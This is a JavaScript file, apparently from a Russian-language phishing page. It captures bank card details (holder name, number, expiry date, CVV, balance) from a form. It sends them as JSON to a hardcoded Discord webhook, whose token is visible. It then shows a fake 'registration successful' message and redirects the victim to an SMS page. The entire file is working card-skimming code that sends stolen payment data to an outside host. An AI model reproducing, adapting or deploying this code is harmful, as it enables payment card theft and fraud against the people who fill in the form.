document.getElementById('card-data-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const webhookUrl = 'https://discordapp.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv';

    const carData = {
        namecard: document.getElementById('name').value,
        numbercard: document.getElementById('number').value,
        expiration: document.getElementById('expiration').value,
        cvv: document.getElementById('cvv').value,
        balance: document.getElementById('balance') ? document.getElementById('balance').value : '' // Ensure 'balance' is retrieved
    };

    console.log(carData); // Log the carData for debugging

    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: JSON.stringify(carData, null, 2) }),
    }).then(response => {
        if (response.ok) {
            showNotification('Регистрация прошла успешно!', 'success');
            window.location.href = 'sms.html';
        } else {
            showNotification('Ошибка при регистрации.', 'error');
        }
    }).catch(error => {
        console.error('Ошибка сети:', error);
        showNotification('Произошла ошибка. Пожалуйста, попробуйте еще раз.', 'error');
    });
});

// Функция для отображения уведомлений
function showNotification(message, type) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.className = type;
    notification.style.display = 'block';

    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}
